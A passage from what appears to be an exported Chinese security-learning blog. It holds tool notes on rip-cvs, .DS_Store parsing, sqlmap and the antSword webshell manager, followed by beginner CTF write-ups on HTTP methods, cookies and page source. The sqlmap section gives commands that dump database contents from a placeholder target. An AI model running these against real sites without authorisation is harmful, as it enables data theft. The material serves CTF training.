</p><p>它会自动执行 <code>svn revert -R .</code></p><p>5、运行示例（适用于 CVS）：（要加.&#x2F;）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-cvs.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/CVS/</span><br></code></pre></td></tr></table></figure><p>This will not rip CVS, but it will display useful info.  </p><p>这不会翻录 CVS，但它会显示有用的信息。</p><h2 id="Python-dsstore"><a href="#Python-dsstore" class="headerlink" title="Python-dsstore"></a>Python-dsstore</h2><h3 id="0x01-介绍-9"><a href="#0x01-介绍-9" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h3><p>这是一个.DS_Store解析工具。</p><p>需要从github上下载工具（具体链接可以从ctfhub里找，那里的工具还是很全的），其中包含Apple的.DS_Store文件格式的解析器。在 .&#x2F;samples&#x2F;目录中包含一个CTF格式的示例文件，您可以使用以下代码尝试解析器。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> ./samples/<span class="hljs-selector-class">.DS_Store</span>.ctf<br></code></pre></td></tr></table></figure><h3 id="0x02-使用-8"><a href="#0x02-使用-8" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><ol><li><p>将需要解析的文件复制到Python-dsstore文件夹中</p></li><li><p>在Python-dsstore文件处打开cmd</p></li><li><p>输入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> .DS_Store的具体文件名<br></code></pre></td></tr></table></figure><p>（也可以参考介绍里的方式，放在其他文件夹里，这就需要输入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> .DS_Store的具体文件位置<br></code></pre></td></tr></table></figure><p>但作者习惯于将.DS_Store文件直接移动到Python-dsstore文件夹中，这样就直接写文件名解析即可，不需要去找路径）</p></li></ol><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>参考文献：</p><p><a href="https://blog.csdn.net/qq_45477063/article/details/129374044" title="sqlmap安装详细教程-CSDN博客">sqlmap安装详细教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688" title="【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_sqlmap使用教程-CSDN博客">【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_sqlmap使用教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131236510" title="SQLmap使用教程图文教程（超详细）-CSDN博客">SQLmap使用教程图文教程（超详细）-CSDN博客</a></p><p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" title="Usage · sqlmapproject&#x2F;sqlmap Wiki · GitHub">Usage · sqlmapproject&#x2F;sqlmap Wiki · GitHub</a>（sqlmap官方使用指南）</p><p>第一个文章讲了在windows下安装sqlmap的教程</p><p>第二个文章可以作为入门的尝试，学习基础功能；</p><p>第三个文章有更多的参数，可以进一步学习；</p><p>最后官方文档最全，可以用来查询参数，用来入门的话太过枯燥</p><h3 id="0x01-介绍-10"><a href="#0x01-介绍-10" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>‌sqlmap‌是一个开源的自动化SQL注入工具，主要用于检测和利用Web应用程序中的SQL注入漏洞。它支持多种数据库系统，包括<a href="https://www.baidu.com/s?wd=MySQL&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=1590Qvjd2Gn/1yvHqNZGYWkQw9bCTrfmFO2daYT0vlmnmgOYeRZZJR4lg6c&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="MySQL">MySQL</a>、<a href="https://www.baidu.com/s?wd=Oracle&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=b6b6//G6o/hyuqWXrsLtJvqPkYusuN0xl9yT5gBmPDYVQZr6bSYD7YgTCyQ&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Oracle">Oracle</a>、<a href="https://www.baidu.com/s?wd=PostgreSQL&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=1233LQ9nR73YGXWVKdZDlS3MpZz8IuYOCnNXFBpf0Xu60jB3aBN1nf5dfJE&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="PostgreSQL">PostgreSQL</a>、<a href="https://www.baidu.com/s?wd=Microsoft%20SQL%20Server&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=5c5bFRyh+bf+COd6bjwbGxogEG5K9e8KKvCuMgEEenwzm7XrsgPONgxvTss&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Microsoft SQL Server">Microsoft SQL Server</a>、<a href="https://www.baidu.com/s?wd=Access&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=ed4etE5MCe1SJYNS/7kB5zX8V85d1tOA7wworx9NrgrksJ+IsO5XgG2rUEw&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Access">Access</a>、<a href="https://www.baidu.com/s?wd=IBM%20DB2&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=0bd3scASM8490KzT9FEFVxUM31qyPFdEln+VsWc2ajGAt5yeMnMiXO73yMo&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="IBM DB2">IBM DB2</a>、<a href="https://www.baidu.com/s?wd=SQLite&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=b24bI/CzXtlI2q24cptKsij/hOaGBKUAu9VzYzGPwFZh858lg/emLmjD3Sw&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="SQLite">SQLite</a>、<a href="https://www.baidu.com/s?wd=Firebird&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=b24bI/CzXtlI2q24cptKsij/hOaGBKUAu9VzYzGPwFZh858lg/emLmjD3Sw&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Firebird">Firebird</a>、<a href="https://www.baidu.com/s?wd=Sybase&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=751188+A9Okn0giy2LROReJAj1bJ6GPAzMQrx9HXjuavB/YlVOwDtumNPsM&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Sybase">Sybase</a>、<a href="https://www.baidu.com/s?wd=SAP%20MaxDB&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=6da1X16yZ+UBauN4uYBlW++anRKP/3zfqY3OsZ7tFXZHtX4fivY7j/+zlWM&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="SAP MaxDB">SAP MaxDB</a>、<a href="https://www.baidu.com/s?wd=HSQLDB&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=a7d4ZphngxRqVKukiqiMlzaHWYkDI40qSM2oBMqrS2/2cNaUu+CLRRSgD5Q&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="HSQLDB">HSQLDB</a>和<a href="https://www.baidu.com/s?wd=Informix&usm=4&ie=utf-8&rsv_pq=bd28f5fc0004b166&oq=sqlmap%E6%98%AF%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7&rsv_t=a7d4ZphngxRqVKukiqiMlzaHWYkDI40qSM2oBMqrS2/2cNaUu+CLRRSgD5Q&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Informix">Informix</a>等。‌</p><p><strong>sqlmap的主要功能：</strong></p><ol><li>‌<strong>数据库指纹识别</strong>‌：sqlmap可以识别目标数据库的类型和版本。</li><li>‌<strong>数据获取</strong>‌：能够枚举数据库中的用户、密码、权限等信息，并下载或上传文件。</li><li>‌<strong>系统命令执行</strong>‌：在获取数据库权限后，可以执行任意系统命令。</li><li>‌<strong>多种注入技术</strong>‌：支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入等多种SQL注入技术。</li></ol><h3 id="0x02-使用-9"><a href="#0x02-使用-9" class="headerlink" title="0x02 使用"></a>0x02 使用</h3><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022008017.png"></p><p><strong>sqlmap使用步骤：</strong></p><p>1、get型：</p><p>先进入sqlmap所在文件夹，在此处打开命令行。</p><p>检测「注入点」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1<br></code></pre></td></tr></table></figure><p>查看所有「数据库」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 --dbs<br></code></pre></td></tr></table></figure><p>查看当前使用的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 --current-db<br></code></pre></td></tr></table></figure><p>查看「数据表」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 -D 数据库名 --tables<br></code></pre></td></tr></table></figure><p>查看「字段」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 -D 数据库名 -T 表名 –columns<br></code></pre></td></tr></table></figure><p>查看「数据」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 -D 数据库名 -T 表名 –dump<br></code></pre></td></tr></table></figure><p>2、post型：</p><p>需要用burpsuite抓包，写入txt文件，然后使用-r参数</p><p>检测「注入点」</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -<span class="hljs-attribute">r</span> txt文件所在位置<br></code></pre></td></tr></table></figure><p>查看所有「数据库」</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">python sqlmap<span class="hljs-selector-class">.py</span> -<span class="hljs-attribute">r</span> txt文件所在位置 <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure><p>（后面依次类推）</p><h2 id="antSword（中国蚁剑）"><a href="#antSword（中国蚁剑）" class="headerlink" title="antSword（中国蚁剑）"></a>antSword（中国蚁剑）</h2><p>参考文献：</p><p><a href="https://cloud.tencent.com/developer/article/2116521" title="23个常见Webshell网站管理工具-腾讯云开发者社区-腾讯云">23个常见Webshell网站管理工具-腾讯云开发者社区-腾讯云</a>（Webshell管理工具介绍）</p><p><a href="https://github.com/AntSwordProject/antSword/blob/master/README_CN.md" title="antSword&#x2F;README_CN.md at master · AntSwordProject&#x2F;antSword · GitHub">antSword&#x2F;README_CN.md at master · AntSwordProject&#x2F;antSword · GitHub</a>（蚁剑官方文档）</p><p><a href="https://www.yuque.com/antswordproject/antsword/lmwppk" title="1. 快速入门 · 语雀">1. 快速入门 · 语雀</a> （官方快速入门文档）</p><h3 id="0x01-介绍-11"><a href="#0x01-介绍-11" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p><strong>中国蚁剑是一款开源的跨平台‌<a href="https://www.baidu.com/s?wd=Webshell&usm=1&ie=utf-8&rsv_pq=c6d64c3500039908&oq=%E8%9A%81%E5%89%91%E6%98%AF%E5%B9%B2%E4%BB%80%E4%B9%88%E7%9A%84&rsv_t=f8598QXBE3OdUf7EBGHWjiXHObzJBOUtPVoozKmL7EZI+RuKoswiSag00jI&rsv_dl=re_dqa_generate&sa=re_dqa_generate" title="Webshell">Webshell</a>管理工具</strong>‌，主要面向合法授权的渗透测试安全人员以及进行常规操作的网站管理员。它提供了一个图形化界面，使得用户可以通过简单的操作连接和控制目标设备或系统。</p><p>Webshell网站管理工具有很多，从较早的中国菜刀，到后来多样的工具，目前国内安全人员常用的有：中国菜刀、中国蚁剑、冰蝎、哥斯拉、Metasploit、SharPyShell等，也有一些内部团队开发的类似工具，但是并没有对外公开。</p><p>蚁剑有多样的插件，为作者常用的，因此主要介绍此工具</p><h3 id="0x02-使用-10"><a href="#0x02-使用-10" class="headerlink" title="0x02 使用"></a>0x02 使用</h3><p>蚁剑的UI界面较为简单，简单尝试即可上手，而且官方快速入门文档是汉语，写的也直观易懂，作者就不过多赘述。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP相关练习-攻防世界</title>
    <link href="/2025/05/04/HTTP%E7%9B%B8%E5%85%B3%E7%BB%83%E4%B9%A0-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2025/05/04/HTTP%E7%9B%B8%E5%85%B3%E7%BB%83%E4%B9%A0-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142716122">https://blog.csdn.net/2302_81178149/article/details/142716122</a></p></blockquote><h2 id="get-post"><a href="#get-post" class="headerlink" title="get-post"></a>get-post</h2><h3 id="一、WP"><a href="#一、WP" class="headerlink" title="一、WP"></a>一、WP</h3><p>（题目本质：考察get与post传参方法）</p><p>用 GET 给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开。例如，在 url 后添加&#x2F;？a&#x3D;1 即可发送 get 请求。</p><p>利用 hackbar 进行 POST 传参：复制 get 的 url（点击load URL），选择 Post data，填入 b&#x3D;2，点击 Execute即可发送 POST 请求。</p><h3 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h3><p>参考作者的另一篇文章：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501" title="HTTP原理及具体细节-CSDN博客">HTTP原理及具体细节-CSDN博客</a></p><h3 id="三、目的"><a href="#三、目的" class="headerlink" title="三、目的"></a>三、目的</h3><p>掌握常用http请求方式(get与post)</p><h3 id="四、相关知识"><a href="#四、相关知识" class="headerlink" title="四、相关知识"></a>四、相关知识</h3><p><strong>1、HTTP的请求方式</strong></p><ul><li>get 方法</li></ul><p>发送一个请求来取得服务器上的某一资源。</p><ul><li>post 方法</li></ul><p>向 url 指定的资源提交数据或附加新的数据。</p><ul><li>put 方法</li></ul><p>put 方法跟 post 方法很像，也是向服务器提交数据，但是 put 方法指向了资源在服务器上的位置，而 post 方法没有。</p><ul><li>head 方法</li></ul><p>只请求页面的首部。</p><ul><li>delete 方法</li></ul><p>删除服务器上的某资源。</p><ul><li>options 方法</li></ul><p>options 方法用于获取当前 url 所支持的方法。如果请求成功，会有一个 allow 的头包含类似 get、post 这样的信息。</p><ul><li>trace 方法</li></ul><p>trace 方法被用于激发一个远程的，应用层的请求消息回路。</p><ul><li>connect 方法</li></ul><p>把请求连接转换到透明的 tcp&#x2F;ip 通道。</p><p><strong>2、get与post的主要区别</strong></p><p>注意：<strong>没有本质区别</strong>，GET和POST的底层也是TCP&#x2F;IP，也就是说，GET&#x2F;POST都是TCP链接。GET和POST能做的事情是一样一样的。</p><p><strong>但在细节上有差距</strong>，</p><p>GET在浏览器回退时是无害的，而POST会再次提交请求。  </p><p>GET产生的URL地址可以被Bookmark，而POST不可以。  </p><p>GET请求会被浏览器主动cache（缓存），而POST不会，除非手动设置。  </p><p>GET请求只能进行url编码，而POST支持多种编码方式。  </p><p>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。  </p><p>GET请求在URL中传送的参数是有长度限制的，而POST没有。（真的吗？保留疑问）  </p><p>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。  </p><p>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。（其实都不安全）  </p><p>GET参数通过URL传递，POST放在Request body中。</p><p>（以上是所谓标准答案）</p><p><strong>GET用于查询，PUT、POST、DELETE用于修改</strong>（这一条是大佬的解释）</p><p><strong>get：获取资源，数据在url上显示着，大家可以看到；post：提交数据，数据在HTTP包里，需抓包查看。</strong>（实际做题的区别）</p><p>两者的区别也可参考下表：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021916883.png"></p><table><thead><tr><th>分类</th><th>GET</th><th>POST</th><th>对比</th></tr></thead><tbody><tr><td>后退按钮&#x2F;刷新</td><td>无害</td><td>数据会被重新提交（浏览器应该告知用户数据会被重新提交）。</td><td>每次都重新提交这无疑会对浏览器造成压力，该问题也是作为web端性能优化的重要方向之一</td></tr><tr><td>缓存</td><td>能被缓存</td><td>不能缓存</td><td>缓存可以为浏览器减少请求链数，web端性能优化的重要方向之一</td></tr><tr><td>历史</td><td>参数保留在浏览器历史中。</td><td>参数不会保存在浏览器历史中。</td><td>相当于缓存，可减少浏览器压力</td></tr><tr><td>对数据长度的限制</td><td>是的，当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是2048个字符）。</td><td>无限制。</td><td>HTTP 协议没有 Body 和 URL 的长度限制，对 URL 限制的大多是浏览器和服务器的原因。<br/>服务器是因为处理长 URL 要消耗比较多的资源，为了性能和安全（防止恶意构造长 URL 来攻击）考虑，会给 URL 长度加限制</td></tr><tr><td>安全性</td><td>与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。在发送密码或其他敏感信息时绝不要使用 GET！</td><td>POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。</td><td>从传输的角度来说，他们都是不安全的，因为 HTTP 在网络上是明文传输的，浏览器F12下什么都一目了然，或者抓个包，就能完整地获取数据报文。<br/>要想安全传输，Encode(转码)当然对于懂的人来说也不安全；比较安全的只有加密，也就是 HTTPS</td></tr><tr><td>对数据类型的限制</td><td>只允许 ASCII 字符。</td><td>没有限制，也允许二进制数据。</td><td>POST选择更多</td></tr></tbody></table><p><strong>3、名词解释：URL与URI的概念及区别</strong></p><p>URL: 在WWW上，每一信息资源都有统一的且在网上的地址，该地址就叫URL（Uniform Resource Locator,统一资源定位器），它是WWW的统一资源定位标志，就是指网络地址。（资源的地址）</p><p>URI: 在电脑术语中，统一资源标识符（Uniform Resource Identifier，URI)是一个用于标识某一互联网资源名称的字符串。 该种标识允许用户对任何（包括本地和互联网）的资源通过特定的协议进行交互操作。URI由包括确定语法和相关协议的方案所定义。（资源的名字）</p><p>Web上可用的每种资源 -HTML文档、图像、视频片段、程序等 - 由一个通用资源标识符（Uniform Resource Identifier, 简称URI）进行定位。</p><p>URL和URI的区别和联系：</p><p>URI是用于标识互联网上的资源的字符串序列，而URI并不关注资源的位置，而只关注它的标识符；</p><p>URL提供了关于资源在互联网上位置的详细信息，而URI是一种更广义的概念，不仅涵盖了URL，还包括了用于标识资源的其他形式，如URN；</p><p>URL是URI的一种特殊类型，用于定位互联网上的资源，而URI则是一种更广义的标识符，用于唯一地标识和命名资源。</p><p><strong>简单来说，URL就是资源的地址，URI就是代表资源的标识符，URI是更广义的、涵盖URL的（地址也可以代表资源）。</strong></p><p><strong>4、hackbar的使用</strong></p><p>具体内容请看作者的另一篇文章</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><h3 id="一、WP-1"><a href="#一、WP-1" class="headerlink" title="一、WP"></a>一、WP</h3><p>(题目本质：考察查看页面源代码的方式，已经限制我们从右键里面点击查看页面源代码)</p><p>&lt;法1&gt;用firefox打开页面，摁下F12，打开查看器可以得到flag</p><p>&lt;法2&gt;快捷键：ctrl加u</p><p>&lt;法3&gt;URL前加<code>view-source:</code>（注意中间的符号不是下划线，是减号）</p><p>&lt;法4&gt;bp抓包，发送给repeater，然后send，在response可以看到源代码</p><h3 id="二、目的"><a href="#二、目的" class="headerlink" title="二、目的"></a>二、目的</h3><p>1、掌握查看源代码的方式</p><p>2、会用浏览器开发者工具</p><p>具体内容请看作者的另一篇文章</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p>3、burpsuite的使用</p><p>可以点击下方链接简单了解bp</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><h3 id="三、相关知识"><a href="#三、相关知识" class="headerlink" title="三、相关知识"></a>三、相关知识</h3><p><strong>名词解释</strong>：抓包（抓出网络数据包）</p><p>抓包是利用特定的软件对网络数据包进行拦截，通过对抓获数据包的内容进行分析，可以得到有用的信息。抓包通过对网络上传输的数据进行抓取，可以对其进行分析，对于软件的Debug很大的帮助，也可以通过抓取用户发送的涉及用户名和密码的数据包来获取用户的无线密码。</p><p>抓包工具更多的用于网络安全，比如查找感染病毒的计算机，获取网页的源代码，以及了解攻击者所用方法，追查攻击者的ip地址等。</p><p><strong>抓包工具的特点</strong>：</p><p>1、抓包对加密数据是没有效果的，需要对握手包进行解密才可以得到需要的敏感数据，用户在执行网络数据文件下载时，抓取出来的是大量垃圾数据包。</p><p>2、抓包可以实时捕获并详细显示各种类型数据包，可以通过多种方式过滤数据包，还可以进行多种统计分析。</p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled-button"></a>disabled-button</h2><h3 id="一、WP-2"><a href="#一、WP-2" class="headerlink" title="一、WP"></a>一、WP</h3><p>&lt;法1&gt;</p><p>F12，在查看器窗口审查元素，发现存在disabled&#x3D;””字段，将disabled&#x3D;””删除后，按钮可按，按下后得到flag</p><p>&lt;法2&gt;</p><p>审计from表单代码，使用hackbar，用post方式传递auth&#x3D;flag，同样可以获得flag（要看懂html）</p><h3 id="二、目的-1"><a href="#二、目的-1" class="headerlink" title="二、目的"></a>二、目的</h3><p>1、初步了解前端知识</p><p>2、学会使用hackbar（参考第一题）</p><h3 id="三、相关知识-1"><a href="#三、相关知识-1" class="headerlink" title="三、相关知识"></a>三、相关知识</h3><p>W3C标准：网页主要由三部分构成（前端三剑客）</p><p>    结构：HTML</p><p>    表现：CSS</p><p>    行为：JavaScript</p><p>HTML：定义了页面的结构和内容，包括文本、图像、链接（重点学习）</p><p>CSS：页面的样式和布局（简单了解）</p><p>JS：用于添加交互性和动态功能作用（以后学XSS会重点学习）</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><strong>Cookie</strong></h2><h3 id="一、WP-3"><a href="#一、WP-3" class="headerlink" title="一、WP"></a><strong>一、WP</strong></h3><p>（题目本质：查看cookie）</p><p>&lt;法1&gt;</p><p>浏览器按下F12键打开开发者工具，刷新后，在存储一栏，可看到名为look-here的cookie的值为cookie.php，访问<code>http://所给地址/cookie.php</code>，提示查看http响应包，在网络一栏，可看到访问cookie.php的数据包。点击查看数据包，在消息头内可发现flag</p><p>&lt;法2&gt;</p><p>第一步 使用 burp 抓包看到 cookie 信息</p><p>第二步 查看cookie</p><p>第三步 使用 Burp 重新抓包一下，发现 FLAG。</p><h3 id="二、原理-1"><a href="#二、原理-1" class="headerlink" title="二、原理"></a><strong>二、原理</strong></h3><p>Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。</p><h3 id="三、目的-1"><a href="#三、目的-1" class="headerlink" title="三、目的"></a><strong>三、目的</strong></h3><p>掌握有关cookie的知识，了解cookie所在位置（会看cookie）</p><h3 id="四、相关知识-1"><a href="#四、相关知识-1" class="headerlink" title="四、相关知识"></a><strong>四、相关知识</strong></h3><p><strong>cookie概念</strong></p><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。</p><p>还是HTTP工作原理里中有讲解：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501" title="HTTP原理及具体细节-CSDN博客">HTTP原理及具体细节-CSDN博客</a></p><h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><strong>baby_web</strong></h2><h3 id="一、WP-4"><a href="#一、WP-4" class="headerlink" title="一、WP"></a><strong>一、WP</strong></h3><p>（题目本质：查看初始页面，初始页面即访问该网站的第一个页面）</p><p>&lt;法1&gt;、</p><p>根据提示，在url中输入index.php,发现打开的仍然还是1.php。打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到location参数被设置了1.php，并且找到flag。</p><p>&lt;法2&gt;、</p><p>一开始进去看到这个页面是 1.php，根据题目提示“主页”，猜测应该存在 index.php，于是访问。输入之后直接跳转到了 1.php，所以用 burp suite 抓包，send to repeater，点击 go，看回复，在头部看到 flag。</p><h3 id="二、原理-2"><a href="#二、原理-2" class="headerlink" title="二、原理"></a><strong>二、原理</strong></h3><p>web请求头中的location作用</p><h3 id="三、目的-2"><a href="#三、目的-2" class="headerlink" title="三、目的"></a><strong>三、目的</strong></h3><p>掌握web响应包头部常见参数</p><p>还是HTTP工作原理里中有讲解：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501" title="HTTP原理及具体细节-CSDN博客">HTTP原理及具体细节-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前置技能(HTTP协议)-CTFHub</title>
    <link href="/2025/05/04/%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BDHTTP%E5%8D%8F%E8%AE%AE-CTFHub/"/>
    <url>/2025/05/04/%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BDHTTP%E5%8D%8F%E8%AE%AE-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142718250">https://blog.csdn.net/2302_81178149/article/details/142718250</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树Web汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5501" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><p>注：CTFHub是动态flag，每个人每次都不一样，要自己动手哦。</p><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><h3 id="一、wp"><a href="#一、wp" class="headerlink" title="一、wp"></a>一、wp</h3><p><strong>即write up（题目解析）</strong></p><p>&lt;法一&gt;、</p><p>题目显示现在的HTTP方法是get，让我们使用CTF**B方法就可以获得flag，要猜到其实就是CTFHUB方法;直接抓包改请求方法，点击go，返回200ok.</p><p>&lt;法二&gt;、</p><p>curl的使用（注意替换url为环境的地址）：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">curl -v -X CTFHUB url/<span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><p>得到flag。</p><h3 id="二、考点"><a href="#二、考点" class="headerlink" title="二、考点"></a>二、考点</h3><p>HTTP请求方法的应用</p><p>curl的使用</p><h3 id="三、相关知识"><a href="#三、相关知识" class="headerlink" 